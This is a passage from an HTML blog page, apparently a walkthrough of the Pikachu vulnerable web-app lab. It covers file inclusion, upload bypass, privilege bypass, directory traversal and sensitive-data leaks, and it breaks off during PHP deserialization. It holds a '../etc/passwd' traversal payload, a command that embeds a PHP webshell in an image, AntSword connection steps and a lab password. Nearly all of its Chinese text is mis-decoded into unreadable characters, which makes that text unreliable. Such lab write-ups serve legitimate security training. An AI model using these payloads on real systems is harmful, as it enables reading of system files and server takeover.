href="#0x06-æ–‡ä»¶åŒ…å«" class="headerlink" title="0x06.æ–‡ä»¶åŒ…å«"></a>0x06.æ–‡ä»¶åŒ…å«</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">File Inclusion(æ–‡ä»¶åŒ…å«æ¼æ´)æ¦‚è¿°æ–‡ä»¶åŒ…å«ï¼Œæ˜¯ä¸€ä¸ªåŠŸèƒ½ã€‚</span><br><span class="line">åœ¨å„ç§å¼€å‘è¯­è¨€ä¸­éƒ½æä¾›äº†å†…ç½®çš„æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œ</span><br><span class="line">å…¶å¯ä»¥ä½¿å¼€å‘äººå‘˜åœ¨ä¸€ä¸ªä»£ç æ–‡ä»¶ä¸­ç›´æ¥åŒ…å«ï¼ˆå¼•å…¥ï¼‰å¦å¤–ä¸€ä¸ªä»£ç æ–‡ä»¶ã€‚ </span><br><span class="line">æ¯”å¦‚ åœ¨PHPä¸­ï¼Œæä¾›äº†ï¼šinclude(),include_once()require(),require_once()è¿™äº›æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œ</span><br><span class="line">è¿™äº›å‡½æ•°åœ¨ä»£ç è®¾è®¡ä¸­è¢«ç»å¸¸ä½¿ç”¨åˆ°ã€‚</span><br><span class="line">å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ–‡ä»¶åŒ…å«å‡½æ•°ä¸­åŒ…å«çš„ä»£ç æ–‡ä»¶æ˜¯å›ºå®šçš„ï¼Œå› æ­¤ä¹Ÿä¸ä¼šå‡ºç°å®‰å…¨é—®é¢˜ã€‚ </span><br><span class="line">ä½†æ˜¯ï¼Œæœ‰äº›æ—¶å€™ï¼Œæ–‡ä»¶åŒ…å«çš„ä»£ç æ–‡ä»¶è¢«å†™æˆäº†ä¸€ä¸ªå˜é‡ï¼Œä¸”è¿™ä¸ªå˜é‡å¯ä»¥ç”±å‰ç«¯ç”¨æˆ·ä¼ è¿›æ¥ï¼Œ</span><br><span class="line">è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœæ²¡æœ‰åšè¶³å¤Ÿçš„å®‰å…¨è€ƒè™‘ï¼Œåˆ™å¯èƒ½ä¼šå¼•å‘æ–‡ä»¶åŒ…å«æ¼æ´ã€‚ </span><br><span class="line">æ”»å‡»ç€ä¼šæŒ‡å®šä¸€ä¸ªâ€œæ„æƒ³ä¸åˆ°â€çš„æ–‡ä»¶è®©åŒ…å«å‡½æ•°å»æ‰§è¡Œï¼Œä»è€Œé€ æˆæ¶æ„æ“ä½œã€‚ </span><br><span class="line">æ ¹æ®ä¸åŒçš„é…ç½®ç¯å¢ƒï¼Œ</span><br><span class="line">æ–‡ä»¶åŒ…å«æ¼æ´åˆ†ä¸ºå¦‚ä¸‹ä¸¤ç§æƒ…å†µï¼š</span><br><span class="line">1.æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼šä»…èƒ½å¤Ÿå¯¹æœåŠ¡å™¨æœ¬åœ°çš„æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œ</span><br><span class="line">ç”±äºæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å¹¶ä¸æ˜¯æ”»å‡»è€…æ‰€èƒ½å¤Ÿæ§åˆ¶çš„ï¼Œå› æ­¤è¯¥æƒ…å†µä¸‹ï¼Œ</span><br><span class="line">æ”»å‡»ç€æ›´å¤šçš„ä¼šåŒ…å«ä¸€äº› å›ºå®šçš„ç³»ç»Ÿé…ç½®æ–‡ä»¶ï¼Œä»è€Œè¯»å–ç³»ç»Ÿæ•æ„Ÿä¿¡æ¯ã€‚</span><br><span class="line">å¾ˆå¤šæ—¶å€™æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ä¼šç»“åˆä¸€äº›ç‰¹æ®Šçš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œä»è€Œå½¢æˆæ›´å¤§çš„å¨åŠ›ã€‚</span><br><span class="line">2.è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼šèƒ½å¤Ÿé€šè¿‡urlåœ°å€å¯¹è¿œç¨‹çš„æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œ</span><br><span class="line">è¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„ä»£ç ï¼Œè¿™ç§æƒ…å†µæ²¡å•¥å¥½è¯´çš„ï¼Œå‡†å¤‡æŒ‚å½©ã€‚</span><br><span class="line">å› æ­¤ï¼Œåœ¨webåº”ç”¨ç³»ç»Ÿçš„åŠŸèƒ½è®¾è®¡ä¸Šå°½é‡ä¸è¦è®©å‰ç«¯ç”¨æˆ·ç›´æ¥ä¼ å˜é‡ç»™åŒ…å«å‡½æ•°ï¼Œ</span><br><span class="line">å¦‚æœéè¦è¿™ä¹ˆåšï¼Œä¹Ÿä¸€å®šè¦åšä¸¥æ ¼çš„ç™½åå•ç­–ç•¥è¿›è¡Œè¿‡æ»¤ã€‚</span><br></pre></td></tr></table></figure><h3 id="01-æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#01-æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="01.æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>01.æœ¬åœ°æ–‡ä»¶åŒ…å«</h3><img src="/2021/04/28/Pikachu/image-20210427153823309.png" class><h3 id="02-è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#02-è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="02.è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>02.è¿œç¨‹æ–‡ä»¶åŒ…å«</h3><p><code>nothing</code></p><h2 id="0x07-ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½"><a href="#0x07-ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½" class="headerlink" title="0x07.ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½"></a>0x07.ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½æ¦‚è¿°æ–‡ä»¶ä¸‹è½½åŠŸèƒ½åœ¨å¾ˆå¤šwebç³»ç»Ÿä¸Šéƒ½ä¼šå‡ºç°ï¼Œ</span><br><span class="line">ä¸€èˆ¬æˆ‘ä»¬å½“ç‚¹å‡»ä¸‹è½½é“¾æ¥ï¼Œä¾¿ä¼šå‘åå°å‘é€ä¸€ä¸ªä¸‹è½½è¯·æ±‚ï¼Œä¸€èˆ¬è¿™ä¸ªè¯·æ±‚ä¼šåŒ…å«ä¸€ä¸ªéœ€è¦ä¸‹è½½çš„æ–‡ä»¶åç§°ï¼Œ</span><br><span class="line">åå°åœ¨æ”¶åˆ°è¯·æ±‚å ä¼šå¼€å§‹æ‰§è¡Œä¸‹è½½ä»£ç ï¼Œå°†è¯¥æ–‡ä»¶åå¯¹åº”çš„æ–‡ä»¶responseç»™æµè§ˆå™¨ï¼Œä»è€Œå®Œæˆä¸‹è½½ã€‚ </span><br><span class="line">å¦‚æœåå°åœ¨æ”¶åˆ°è¯·æ±‚çš„æ–‡ä»¶åå,å°†å…¶ç›´æ¥æ‹¼è¿›ä¸‹è½½æ–‡ä»¶çš„è·¯å¾„ä¸­è€Œä¸å¯¹å…¶è¿›è¡Œå®‰å…¨åˆ¤æ–­çš„è¯ï¼Œ</span><br><span class="line">åˆ™å¯èƒ½ä¼šå¼•å‘ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½æ¼æ´ã€‚æ­¤æ—¶å¦‚æœ æ”»å‡»è€…æäº¤çš„ä¸æ˜¯ä¸€ä¸ªç¨‹åºé¢„æœŸçš„çš„æ–‡ä»¶åï¼Œ</span><br><span class="line">è€Œæ˜¯ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„è·¯å¾„(æ¯”å¦‚../../../etc/passwd),åˆ™å¾ˆæœ‰å¯èƒ½ä¼šç›´æ¥å°†è¯¥æŒ‡å®šçš„æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ã€‚ </span><br><span class="line">ä»è€Œå¯¼è‡´åå°æ•æ„Ÿä¿¡æ¯(å¯†ç æ–‡ä»¶ã€æºä»£ç ç­‰)è¢«ä¸‹è½½ã€‚æ‰€ä»¥ï¼Œåœ¨è®¾è®¡æ–‡ä»¶ä¸‹è½½åŠŸèƒ½æ—¶ï¼Œ</span><br><span class="line">å¦‚æœä¸‹è½½çš„ç›®æ ‡æ–‡ä»¶æ˜¯ç”±å‰ç«¯ä¼ è¿›æ¥çš„ï¼Œåˆ™ä¸€å®šè¦å¯¹ä¼ è¿›æ¥çš„æ–‡ä»¶è¿›è¡Œå®‰å…¨è€ƒè™‘ã€‚ </span><br><span class="line">åˆ‡è®°ï¼šæ‰€æœ‰ä¸å‰ç«¯äº¤äº’çš„æ•°æ®éƒ½æ˜¯ä¸å®‰å…¨çš„ï¼Œä¸èƒ½æ‰ä»¥è½»å¿ƒï¼</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210427170920823.png" class><h2 id="0x08-ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ "><a href="#0x08-ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="0x08.ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ "></a>0x08.ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ </h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´æ¦‚è¿°æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½åœ¨webåº”ç”¨ç³»ç»Ÿå¾ˆå¸¸è§ï¼Œ</span><br><span class="line">æ¯”å¦‚å¾ˆå¤šç½‘ç«™æ³¨å†Œçš„æ—¶å€™éœ€è¦ä¸Šä¼ å¤´åƒã€ä¸Šä¼ é™„ä»¶ç­‰ç­‰ã€‚å½“ç”¨æˆ·ç‚¹å‡»ä¸Šä¼ æŒ‰é’®åï¼Œ</span><br><span class="line">åå°ä¼šå¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œåˆ¤æ–­ æ¯”å¦‚æ˜¯å¦æ˜¯æŒ‡å®šçš„ç±»å‹ã€åç¼€åã€å¤§å°ç­‰ç­‰ï¼Œ</span><br><span class="line">ç„¶åå°†å…¶æŒ‰ç…§è®¾è®¡çš„æ ¼å¼è¿›è¡Œé‡å‘½ååå­˜å‚¨åœ¨æŒ‡å®šçš„ç›®å½•ã€‚ </span><br><span class="line">å¦‚æœè¯´åå°å¯¹ä¸Šä¼ çš„æ–‡ä»¶æ²¡æœ‰è¿›è¡Œä»»ä½•çš„å®‰å…¨åˆ¤æ–­æˆ–è€…åˆ¤æ–­æ¡ä»¶ä¸å¤Ÿä¸¥è°¨ï¼Œ</span><br><span class="line">åˆ™æ”»å‡»ç€å¯èƒ½ä¼šä¸Šä¼ ä¸€äº›æ¶æ„çš„æ–‡ä»¶ï¼Œæ¯”å¦‚ä¸€å¥è¯æœ¨é©¬ï¼Œä»è€Œå¯¼è‡´åå°æœåŠ¡å™¨è¢«webshellã€‚</span><br><span class="line">æ‰€ä»¥ï¼Œåœ¨è®¾è®¡æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½æ—¶ï¼Œä¸€å®šè¦å¯¹ä¼ è¿›æ¥çš„æ–‡ä»¶è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘ã€‚</span><br><span class="line">æ¯”å¦‚ï¼š--éªŒè¯æ–‡ä»¶ç±»å‹ã€åç¼€åã€å¤§å°;--éªŒè¯æ–‡ä»¶çš„ä¸Šä¼ æ–¹å¼;</span><br><span class="line">--å¯¹æ–‡ä»¶è¿›è¡Œä¸€å®šå¤æ‚çš„é‡å‘½å;--ä¸è¦æš´éœ²æ–‡ä»¶ä¸Šä¼ åçš„è·¯å¾„;--ç­‰ç­‰...</span><br></pre></td></tr></table></figure><h3 id="01-client-check"><a href="#01-client-check" class="headerlink" title="01.client check"></a>01.client check</h3><p><code>æŠ“åŒ…æ”¹åå³å¯</code></p><img src="/2021/04/28/Pikachu/image-20210427172209197.png" class><p><code>èšå‰‘è¿æ¥</code></p><img src="/2021/04/28/Pikachu/image-20210427172237838.png" class><h3 id="02-MIME-type"><a href="#02-MIME-type" class="headerlink" title="02.MIME type"></a>02.MIME type</h3><p><code>æŠ“åŒ…ä¿®æ”¹æ–‡ä»¶ç±»å‹å³å¯</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">å¸¸è§çš„MIMEç±»å‹è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€æ–‡æœ¬</span><br><span class="line">.html,.html text/htmlæ™®é€šæ–‡æœ¬ </span><br><span class="line">.txt text/plainRTFæ–‡æœ¬ </span><br><span class="line">.rtf application/rtfGIFå›¾å½¢ </span><br><span class="line">.gif image/gifJPEGå›¾å½¢ </span><br><span class="line">.ipeg,.jpg image/jpegauå£°éŸ³æ–‡ä»¶ </span><br><span class="line">.au audio/basicMIDIéŸ³ä¹æ–‡ä»¶ </span><br><span class="line">.mid,.midi audio/midi,audio/x-midiRealAudioéŸ³ä¹æ–‡ä»¶ </span><br><span class="line">.ra, .ram audio/x-pn-realaudioMPEGæ–‡ä»¶ </span><br><span class="line">.mpg,.mpeg video/mpegAVIæ–‡ä»¶ </span><br><span class="line">.avi video/x-msvideoGZIPæ–‡ä»¶ </span><br><span class="line">.gz application/x-gzipTARæ–‡ä»¶ </span><br><span class="line">.tar application/x-tar</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210427172741958.png" class><h3 id="03-getimagesize"><a href="#03-getimagesize" class="headerlink" title="03.getimagesize"></a>03.getimagesize</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è¿™ä¸ªå‡½æ•°åŠŸèƒ½ä¼šå¯¹ç›®æ ‡æ–‡ä»¶çš„16è¿›åˆ¶å»è¿›è¡Œä¸€ä¸ªè¯»å–ï¼Œ</span><br><span class="line">å»è¯»å–å¤´å‡ ä¸ªå­—ç¬¦ä¸²æ˜¯ä¸æ˜¯ç¬¦åˆå›¾ç‰‡çš„è¦æ±‚çš„,</span><br><span class="line">æ‰€ä»¥ä¸èƒ½é€šè¿‡ä¿®æ”¹content-typeæ¥è¾¾åˆ°ç›®çš„ï¼Œ</span><br><span class="line">éœ€è¦å°†ä¸€å¥è¯æ”¾å…¥ä¸€å¼ çœŸæ­£çš„å›¾ç‰‡    copy shell.jpg/b + shell.php/b shell.jpg</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210427205034653.png" class><p><code>åŒ…å«è¿™ä¸ªå›¾ç‰‡é©¬ï¼Œå†ç”¨èšå‰‘è¿æ¥</code></p><h2 id="0x09-è¶Šæƒ"><a href="#0x09-è¶Šæƒ" class="headerlink" title="0x09.è¶Šæƒ"></a>0x09.è¶Šæƒ</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœä½¿ç”¨Aç”¨æˆ·çš„æƒé™å»æ“ä½œBç”¨æˆ·çš„æ•°æ®ï¼ŒAçš„æƒé™å°äºBçš„æƒé™ï¼Œ</span><br><span class="line">å¦‚æœèƒ½å¤ŸæˆåŠŸæ“ä½œï¼Œåˆ™ç§°ä¹‹ä¸ºè¶Šæƒæ“ä½œã€‚ è¶Šæƒæ¼æ´å½¢æˆçš„åŸå› æ˜¯åå°ä½¿ç”¨äº†ä¸åˆç†çš„æƒé™æ ¡éªŒè§„åˆ™å¯¼è‡´çš„ã€‚</span><br><span class="line">ä¸€èˆ¬è¶Šæƒæ¼æ´å®¹æ˜“å‡ºç°åœ¨æƒé™é¡µé¢ï¼ˆéœ€è¦ç™»å½•çš„é¡µé¢ï¼‰å¢ã€åˆ ã€æ”¹ã€æŸ¥çš„çš„åœ°æ–¹ï¼Œ</span><br><span class="line">å½“ç”¨æˆ·å¯¹æƒé™é¡µé¢å†…çš„ä¿¡æ¯è¿›è¡Œè¿™äº›æ“ä½œæ—¶ï¼Œåå°éœ€è¦å¯¹ å¯¹å½“å‰ç”¨æˆ·çš„æƒé™è¿›è¡Œæ ¡éªŒï¼Œ</span><br><span class="line">çœ‹å…¶æ˜¯å¦å…·å¤‡æ“ä½œçš„æƒé™ï¼Œä»è€Œç»™å‡ºå“åº”ï¼Œè€Œå¦‚æœæ ¡éªŒçš„è§„åˆ™è¿‡äºç®€å•åˆ™å®¹æ˜“å‡ºç°è¶Šæƒæ¼æ´ã€‚</span><br><span class="line">å› æ­¤ï¼Œåœ¨åœ¨æƒé™ç®¡ç†ä¸­åº”è¯¥éµå®ˆï¼š</span><br><span class="line">1.ä½¿ç”¨æœ€å°æƒé™åŸåˆ™å¯¹ç”¨æˆ·è¿›è¡Œèµ‹æƒ;</span><br><span class="line">2.ä½¿ç”¨åˆç†ï¼ˆä¸¥æ ¼ï¼‰çš„æƒé™æ ¡éªŒè§„åˆ™;</span><br><span class="line">3.ä½¿ç”¨åå°ç™»å½•æ€ä½œä¸ºæ¡ä»¶è¿›è¡Œæƒé™åˆ¤æ–­,åˆ«åŠ¨ä¸åŠ¨å°±çç”¨å‰ç«¯ä¼ è¿›æ¥çš„æ¡ä»¶ã€‚</span><br></pre></td></tr></table></figure><h3 id="01-æ°´å¹³è¶Šæƒ"><a href="#01-æ°´å¹³è¶Šæƒ" class="headerlink" title="01.æ°´å¹³è¶Šæƒ"></a>01.æ°´å¹³è¶Šæƒ</h3><p><code>ä¿®æ”¹usernameå€¼å¯ä»¥å‘ç°å¯ä»¥æŸ¥çœ‹ä»»æ„ç”¨æˆ·ä¿¡æ¯</code></p><h3 id="02-å‚ç›´è¶Šæƒ"><a href="#02-å‚ç›´è¶Šæƒ" class="headerlink" title="02.å‚ç›´è¶Šæƒ"></a>02.å‚ç›´è¶Šæƒ</h3><p><code>ä½¿ç”¨pikachuç™»å…¥è®¿é—®vul/overpermission/op2/op2_admin_edit.php</code></p><img src="/2021/04/28/Pikachu/image-20210427212129726.png" class><h2 id="0x10-ç›®å½•éå†"><a href="#0x10-ç›®å½•éå†" class="headerlink" title="0x10.ç›®å½•éå†"></a>0x10.ç›®å½•éå†</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ç›®å½•éå†æ¼æ´æ¦‚è¿°</span><br><span class="line">åœ¨webåŠŸèƒ½è®¾è®¡ä¸­,å¾ˆå¤šæ—¶å€™æˆ‘ä»¬ä¼šè¦å°†éœ€è¦è®¿é—®çš„æ–‡ä»¶å®šä¹‰æˆå˜é‡ï¼Œ</span><br><span class="line">ä»è€Œè®©å‰ç«¯çš„åŠŸèƒ½ä¾¿çš„æ›´åŠ çµæ´»ã€‚ å½“ç”¨æˆ·å‘èµ·ä¸€ä¸ªå‰ç«¯çš„è¯·æ±‚æ—¶ï¼Œ</span><br><span class="line">ä¾¿ä¼šå°†è¯·æ±‚çš„è¿™ä¸ªæ–‡ä»¶çš„å€¼(æ¯”å¦‚æ–‡ä»¶åç§°)ä¼ é€’åˆ°åå°ï¼Œåå°å†æ‰§è¡Œå…¶å¯¹åº”çš„æ–‡ä»¶ã€‚ </span><br><span class="line">åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå¦‚æœåå°æ²¡æœ‰å¯¹å‰ç«¯ä¼ è¿›æ¥çš„å€¼è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘ï¼Œ</span><br><span class="line">åˆ™æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡â€œ../â€è¿™æ ·çš„æ‰‹æ®µè®©åå°æ‰“å¼€æˆ–è€…æ‰§è¡Œä¸€äº›å…¶ä»–çš„æ–‡ä»¶ã€‚ </span><br><span class="line">ä»è€Œå¯¼è‡´åå°æœåŠ¡å™¨ä¸Šå…¶ä»–ç›®å½•çš„æ–‡ä»¶ç»“æœè¢«éå†å‡ºæ¥ï¼Œå½¢æˆç›®å½•éå†æ¼æ´ã€‚</span><br><span class="line">çœ‹åˆ°è¿™é‡Œ,ä½ å¯èƒ½ä¼šè§‰å¾—ç›®å½•éå†æ¼æ´å’Œä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½ï¼Œ</span><br><span class="line">ç”šè‡³æ–‡ä»¶åŒ…å«æ¼æ´æœ‰å·®ä¸å¤šçš„æ„æ€ï¼Œ</span><br><span class="line">æ˜¯çš„ï¼Œç›®å½•éå†æ¼æ´å½¢æˆçš„æœ€ä¸»è¦çš„åŸå› è·Ÿè¿™ä¸¤è€…ä¸€æ ·ï¼Œ</span><br><span class="line">éƒ½æ˜¯åœ¨åŠŸèƒ½è®¾è®¡ä¸­å°†è¦æ“ä½œçš„æ–‡ä»¶ä½¿ç”¨å˜é‡çš„ æ–¹å¼ä¼ é€’ç»™äº†åå°ï¼Œ</span><br><span class="line">è€Œåˆæ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘è€Œé€ æˆçš„ï¼Œåªæ˜¯å‡ºç°çš„ä½ç½®æ‰€å±•ç°çš„ç°è±¡ä¸ä¸€æ ·ï¼Œ</span><br><span class="line">å› æ­¤ï¼Œè¿™é‡Œè¿˜æ˜¯å•ç‹¬æ‹¿å‡ºæ¥å®šä¹‰ä¸€ä¸‹ã€‚</span><br><span class="line">éœ€è¦åŒºåˆ†ä¸€ä¸‹çš„æ˜¯,</span><br><span class="line">å¦‚æœä½ é€šè¿‡ä¸å¸¦å‚æ•°çš„urlï¼ˆæ¯”å¦‚ï¼šhttp://xxxx/docï¼‰åˆ—å‡ºäº†docæ–‡ä»¶å¤¹é‡Œé¢æ‰€æœ‰çš„æ–‡ä»¶ï¼Œ</span><br><span class="line">è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬æˆä¸ºæ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚ </span><br><span class="line">è€Œå¹¶ä¸å½’ä¸ºç›®å½•éå†æ¼æ´ã€‚</span><br></pre></td></tr></table></figure><blockquote><p>?title=../../../../../../../etc/passwd</p></blockquote><img src="/2021/04/28/Pikachu/image-20210427212801523.png" class><h2 id="0x11-æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#0x11-æ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="0x11.æ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>0x11.æ•æ„Ÿä¿¡æ¯æ³„éœ²</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">æ•æ„Ÿä¿¡æ¯æ³„éœ²æ¦‚è¿°</span><br><span class="line">ç”±äºåå°äººå‘˜çš„ç–å¿½æˆ–è€…ä¸å½“çš„è®¾è®¡ï¼Œå¯¼è‡´ä¸åº”è¯¥è¢«å‰ç«¯ç”¨æˆ·çœ‹åˆ°çš„æ•°æ®è¢«è½»æ˜“çš„è®¿é—®åˆ°ã€‚ </span><br><span class="line">æ¯”å¦‚ï¼š</span><br><span class="line">---é€šè¿‡è®¿é—®urlä¸‹çš„ç›®å½•ï¼Œå¯ä»¥ç›´æ¥åˆ—å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨;</span><br><span class="line">---è¾“å…¥é”™è¯¯çš„urlå‚æ•°åæŠ¥é”™ä¿¡æ¯é‡Œé¢åŒ…å«æ“ä½œç³»ç»Ÿã€ä¸­é—´ä»¶ã€å¼€å‘è¯­è¨€çš„ç‰ˆæœ¬æˆ–å…¶ä»–ä¿¡æ¯;</span><br><span class="line">---å‰ç«¯çš„æºç ï¼ˆhtml,css,jsï¼‰é‡Œé¢åŒ…å«äº†æ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚åå°ç™»å½•åœ°å€ã€å†…ç½‘æ¥å£ä¿¡æ¯ã€ç”šè‡³è´¦å·å¯†ç ç­‰;</span><br><span class="line">ç±»ä¼¼ä»¥ä¸Šè¿™äº›æƒ…å†µï¼Œæˆ‘ä»¬æˆä¸ºæ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚</span><br><span class="line">æ•æ„Ÿä¿¡æ¯æ³„éœ²è™½ç„¶ä¸€ç›´è¢«è¯„ä¸ºå±å®³æ¯”è¾ƒä½çš„æ¼æ´ï¼Œ</span><br><span class="line">ä½†è¿™äº›æ•æ„Ÿä¿¡æ¯å¾€å¾€ç»™æ”»å‡»ç€å®æ–½è¿›ä¸€æ­¥çš„æ”»å‡»æä¾›å¾ˆå¤§çš„å¸®åŠ©,</span><br><span class="line">ç”šè‡³â€œç¦»è°±â€çš„æ•æ„Ÿä¿¡æ¯æ³„éœ²ä¹Ÿä¼šç›´æ¥é€ æˆä¸¥é‡çš„æŸå¤±ã€‚ </span><br><span class="line">å› æ­¤,åœ¨webåº”ç”¨çš„å¼€å‘ä¸Šï¼Œé™¤äº†è¦è¿›è¡Œå®‰å…¨çš„ä»£ç ç¼–å†™ï¼Œ</span><br><span class="line">ä¹Ÿéœ€è¦æ³¨æ„å¯¹æ•æ„Ÿä¿¡æ¯çš„åˆç†å¤„ç†ã€‚</span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹æºç å‘ç°ç”¨æˆ· lili/123456</code></p><h2 id="0x12-PHPååºåˆ—åŒ–"><a href="#0x12-PHPååºåˆ—åŒ–" class="headerlink" title="0x12.PHPååºåˆ—åŒ–"></a>0x12.PHPååºåˆ—åŒ–</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">åœ¨ç†è§£è¿™ä¸ªæ¼æ´å‰,ä½ éœ€è¦å…ˆææ¸…æ¥šphpä¸­serialize()ï¼Œunserialize()è¿™ä¸¤ä¸ªå‡½æ•°ã€‚</span><br><span class="line"></span><br><span class="line">åºåˆ—åŒ–serialize()</span><br><span class="line">åºåˆ—åŒ–è¯´é€šä¿—ç‚¹å°±æ˜¯æŠŠä¸€ä¸ªå¯¹è±¡å˜æˆå¯ä»¥ä¼ è¾“çš„å­—ç¬¦ä¸²,æ¯”å¦‚ä¸‹é¢æ˜¯ä¸€ä¸ªå¯¹è±¡:</span><br><span class="line">    class S&#123;</span><br><span class="line">        public $test=&quot;pikachu&quot;;</span><br><span class="line">    